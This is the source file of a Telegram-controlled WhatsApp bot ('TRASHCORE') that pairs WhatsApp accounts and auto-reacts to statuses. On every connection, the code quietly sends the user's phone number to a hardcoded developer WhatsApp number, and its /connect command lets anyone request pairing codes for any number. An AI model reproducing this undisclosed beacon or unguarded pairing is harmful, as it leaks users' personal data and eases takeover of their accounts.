const { makeWASocket, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason,jidDecode ,makeInMemoryStore, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const pino = require('pino');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const speed = require("performance-now")
const moment = require("moment-timezone");
const crypto = require('crypto')


const startTime = Date.now();
const createToxxicStore = require('./tele/basestore');
const store = createToxxicStore('./store', {
  logger: pino().child({ level: 'silent', stream: 'store' }) });
const settings = require("./config.json")
const BOT_TOKEN = settings.BOT_TOKEN;  // Replace with your Telegram bot token
let OWNER_ID = settings.OWNER_ID
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 }); // Store request counts for 2 minutes
let connectedUsers = {}; // Maps chat IDs to phone numbers
const trashdev = '254788460897@s.whatsapp.net';
const connectedUsersFilePath = path.join(__dirname, 'connectedUsers.json');
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./library/lib/function.js')

const formatTime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? `${d} ${d === 1 ? 'day, ' : 'days, '}` : '';
  const hDisplay = h > 0 ? `${h} ${h === 1 ? 'hour, ' : 'hours, '}` : '';
  const mDisplay = m > 0 ? `${m} ${m === 1 ? 'minute, ' : 'minutes, '}` : '';
  const sDisplay = s > 0 ? `${s} ${s === 1 ? 'second' : 'seconds'}` : '';
  return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;
};


// Load connected users from the JSON file
function loadConnectedUsers() {
    if (fs.existsSync(connectedUsersFilePath)) {
        const data = fs.readFileSync(connectedUsersFilePath);
        connectedUsers = JSON.parse(data);
    }
}

// Save connected users to the JSON file
function saveConnectedUsers() {
    fs.writeFileSync(connectedUsersFilePath, JSON.stringify(connectedUsers, null, 2));
}

let isFirstLog = true;

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
    const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        console.log(`Session directory does not exist for ${phoneNumber}.`);
        return; // Exit the function if the session does not exist
    }

    let { version, isLatest } = await fetchLatestBaileysVersion();
    if (isFirstLog) {
        console.log(`Using Baileys version: ${version} (Latest: ${isLatest})`);
        isFirstLog = false;
    }


    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });
    store.bind(conn.ev);
conn.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && `${decode.user}@${decode.server}` || jid;
        } else return jid;
    };
    // Check if session credentials are already saved
    if (conn.authState.creds.registered) {
        await saveCreds();
        console.log(`Session credentials reloaded successfully for ${phoneNumber}!`);
    } else {
        // If not registered, generate a pairing code
        if (telegramChatId) {
            setTimeout(async () => {
                let code = await conn.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                pairingCodes.set(code, { count: 0, phoneNumber });
                bot.sendMessage(telegramChatId, `Your Pairing Code for ${phoneNumber}: ${code}`);
                console.log(`Your Pairing Code for ${phoneNumber}: ${code}`);
            }, 3000);
        }
    }
    //autostatus view
        conn.ev.on('messages.upsert', async chatUpdate => {
        	if (global.statusview){
        try {
            if (!chatUpdate.messages || chatUpdate.messages.length === 0) return;
            const mek = chatUpdate.messages[0];

            if (!mek.message) return;
            mek.message =
                Object.keys(mek.message)[0] === 'ephemeralMessage'
                    ? mek.message.ephemeralMessage.message
                    : mek.message;

            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                let emoji = [ "❤️", "😍", "💙" ];
                let sigma = emoji[Math.floor(Math.random() * emoji.length)];
                await conn.readMessages([mek.key]);
                conn.sendMessage(
                    'status@broadcast',
                    { react: { text: sigma, key: mek.key } },
                    { statusJidList: [mek.key.participant] },
                );
            }

        } catch (err) {
            console.error(err);
        }
      }
   }
 )
    conn.public = true
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await saveCreds();
            console.log(`Credentials saved successfully for ${phoneNumber}!`);

            // Send success messages to the user on Telegram
            if (telegramChatId) {
                if (!connectedUsers[telegramChatId]) {
                    connectedUsers[telegramChatId] = [];
                }
                                connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: startTime });
                saveConnectedUsers(); // Save connected users after updating
                bot.sendMessage(telegramChatId, `
┏━━『🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-≈🚭 』━━┓

▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  ◈ STATUS    : CONNECTED
  ◈ USER     : ${phoneNumber}
  ◈ SOCKET     : WHATSAPP
  ◈ Dev     : t.me/trashcoredev
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
`)
		console.log(`
┏━━『 🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-≈🚭』━━┓

▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  ◈ STATUS    : CONNECTED
  ◈ USER     : ${phoneNumber}
  ◈ SOCKET     : WHATSAPP
  ◈ Dev     : t.me/trashcoredev
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄`);
            }

            // Send a success message to the lord on WhatsApp
            try {
                await conn.sendMessage(trashdev, { text: `
┏━━『🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-≈🚭 』━━┓

▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  ◈ STATUS    : CONNECTED
  ◈ USER     : ${phoneNumber}
  ◈ SOCKET     : WHATSAPP
  ◈ Dev     : t.me/trashcoredev
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
` });
            } catch (error) {
                console.error('Error sending message to admin:', error);
            }
        } else if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log(`Session closed for ${phoneNumber}. Attempting to restart...`);
                startWhatsAppBot(phoneNumber, telegramChatId);
            }
        }
    });
conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, {
        text: text,
        ...options
    }, {
        quoted,
        ...options
    });
	
    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async chatUpdate => {
        try {
            let mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
            let m = smsg(conn, mek, store);
            require("./WhatsApp.js")(conn, m, chatUpdate, store);
        } catch (err) {
            console.log(err);
        }
    });
    return conn;

            }

        

// Handle /connect command
bot.onText(/\/connect (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];

    // Check if the number is allowed
    const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        // If the session does not exist, create the directory
        fs.mkdirSync(sessionPath, { recursive: true });
        console.log(`Session directory created for ${phoneNumber}.`);
        bot.sendMessage(chatId, `Session directory created for ${phoneNumber}.`);

        // Generate and send pairing code
        startWhatsAppBot(phoneNumber, chatId).catch(err => {
            console.log('Error:', err);
            bot.sendMessage(chatId, 'An error occurred while connecting.');
        });
    } else {
        // If the session already exists, check if the user is already connected
        const isAlreadyConnected = connectedUsers[chatId] && connectedUsers[chatId].some(user => user.phoneNumber === phoneNumber);
        if (isAlreadyConnected) {
            bot.sendMessage(chatId, `The phone number ${phoneNumber} is already connected. Please use /delsession to remove it before connecting again.`);
            return;
        }

        // Proceed with the connection if the session exists
        bot.sendMessage(chatId, `The session for ${phoneNumber} already exists. You can use /delsession to remove it or connect again.`);
    }
});


// Handle /delete command
bot.onText(/\/delsession (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const ownerId = msg.from.id.toString();
    const phoneNumber = match[1];
    const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
    if (ownerId !== OWNER_ID) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
    }
    // Check if the session directory exists
    if (fs.existsSync(sessionPath)) {
           fs.rmSync(sessionPath, { recursive: true, force: true });
            bot.sendMessage(chatId, `Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);
            connectedUsers[chatId] = connectedUsers[chatId].filter(user => user.phoneNumber !== phoneNumber); // Remove the association after deletion
            saveConnectedUsers(); // Save updated connected users
    } else {
        bot.sendMessage(chatId, `No session found for ${phoneNumber}. It may have already been deleted.`);
    }
});

// Handle /menu command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
   const pic = fs.readFileSync('./library/media/porno.jpg');
    const menuText = `
╭─⊷𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄─
│▢ Owner: trashcore
│▢ Version: 1.3.0
│▢ Type: TelexWa
╰────────────
╭─⊷🐦‍🔥MAIN-CMD─
│ • connect   <wa_number>            
│ • delsession <wa_number>
│ • status
│ • start  
╰────────────
    `;
    bot.sendMessage(chatId,menuText);
        
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const connectedUser  = connectedUsers[chatId];

    if (connectedUser  && connectedUser .length > 0) {
        let statusText = `Bot Status:\n- Connected Numbers:\n`;
        connectedUser .forEach(user => {
            const uptime = Math.floor((Date.now() - user.connectedAt) / 1000); // Runtime in seconds
            statusText += `${user.phoneNumber} (Uptime: ${uptime} seconds)\n`;
        });
        bot.sendMessage(chatId, statusText);
    } else {
        bot.sendMessage(chatId, `You have no registered numbers.`);
    }
});

// Function to load all session files
async function loadAllSessions() {
    const sessionsDir = path.join(__dirname, 'trash_baileys');
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
    }

    const sessionFiles = fs.readdirSync(sessionsDir);
    for (const file of sessionFiles) {
        const phoneNumber = file.replace('session_', '');
        await startWhatsAppBot(phoneNumber);
    }
}

// Ensure all sessions are loaded on startup
loadConnectedUsers(); // Load Connected users from the JSON file
loadAllSessions().catch(err => {
    console.log('Error loading sessions:', err);
});

// Start the bot
console.log('Telegram bot is running...');


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})
